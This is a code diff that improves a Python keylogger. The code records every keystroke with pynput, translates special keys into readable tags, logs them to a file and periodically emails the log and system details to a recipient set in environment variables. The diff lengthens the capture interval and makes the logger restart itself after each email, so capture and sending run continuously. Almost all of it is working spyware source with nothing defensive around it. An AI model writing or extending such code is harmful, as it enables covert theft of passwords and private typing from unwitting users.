@@ -15,12 +15,15 @@ from pynput.keyboard import Key, Listener
 load_dotenv(find_dotenv(".env"))
 
 # Email configuration with environment variables(for privacy purposes)
-smtp_server = os.getenv('SMTP_SERVER')
-print(smtp_server)
-smtp_port = int(os.getenv('SMTP_PORT'))
-sender_email = os.getenv('SENDER_EMAIL')
-sender_password = os.getenv('SENDER_PASSWORD')
-recipient_email = os.getenv('RECIPIENT_EMAIL')
+try:
+    smtp_server = os.getenv('SMTP_SERVER')
+    smtp_port = int(os.getenv('SMTP_PORT'))
+    sender_email = os.getenv('SENDER_EMAIL')
+    sender_password = os.getenv('SENDER_PASSWORD')
+    recipient_email = os.getenv('RECIPIENT_EMAIL')
+except ValueError as e:
+    print(f"Error: {e}")
+    exit(1)
 
 # Log file path
 # log_file = os.path.expanduser("~\\AppData\\Roaming\\keylog.txt") # ForWindows
@@ -43,21 +46,37 @@ def get_pc_vitals():
     }
 
 
-# # Function to log keys
-# def on_press(key):
-#     try:
-#         logging.info(str(key.char))
-#     except AttributeError:
-#         logging.info(str(key))
-# -----------------------------------
 # List to store key presses
 key_presses = []
+# Mapping special keys to more readable names
+special_keys = {
+    Key.space: ' ',
+    Key.enter: '\n',
+    Key.backspace: '[BACKSPACE]',
+    Key.shift: '[SHIFT]',
+    Key.shift_r: '[SHIFT]',
+    Key.ctrl_l: '[CTRL]',
+    Key.ctrl_r: '[CTRL]',
+    Key.alt_l: '[ALT]',
+    Key.alt_r: '[ALT]',
+    Key.tab: '    ',
+    Key.delete: '[DELETE]',
+    Key.esc: '[ESC]',
+    Key.caps_lock: '[CAPS_LOCK]',
+    Key.cmd: '[CMD]',
+    Key.left: '[LEFT_ARROW]',
+    Key.right: '[RIGHT_ARROW]',
+    Key.up: '[UP_ARROW]',
+    Key.down: '[DOWN_ARROW]',
+}
 
 
 # Function to log keys in a readable paragraph format
 def on_press(key):
     try:
-        if hasattr(key, 'char') and key.char is not None:
+        if key in special_keys:
+            key_presses.append(special_keys[key])
+        elif hasattr(key, 'char') and key.char is not None:
             key_presses.append(key.char)
         else:
             key_presses.append(f'[{key}]')
@@ -68,7 +87,7 @@ def on_press(key):
 # Function to write key presses to log file in paragraph format
 def write_key_presses_to_log():
     with open(log_file, 'a') as f:
-        f.write(' '.join(key_presses) + '\n')
+        f.write(''.join(key_presses) + '\n')
     key_presses.clear()
 
 
@@ -132,17 +151,19 @@ def stop_logging_and_send_email():
     pc_vitals = get_pc_vitals()
     send_email_with_vitals(pc_vitals)
     os.remove(log_file)  # Delete the log file after sending
+    # Restart the keylogger for the next interval
+    start_keylogger()
 
 
-# Function to start keylogger and set timer to stop logging after 1 minute
+# Function to start keylogger and set timer to stop logging after 2 minutes
 def start_keylogger():
     global listener
     listener = Listener(on_press=on_press)
     listener.start()
-    # Stop logging and send email after 1 minute
-    threading.Timer(60, stop_logging_and_send_email).start()
-    # Periodically write key presses to log file
-    threading.Timer(59, write_key_presses_to_log).start()
+    # Stop logging and send email after 2 minutes
+    threading.Timer(120, stop_logging_and_send_email).start()
+    # Periodically write key presses to log file every minute
+    threading.Timer(60, write_key_presses_to_log).start()
     listener.join()
 
 
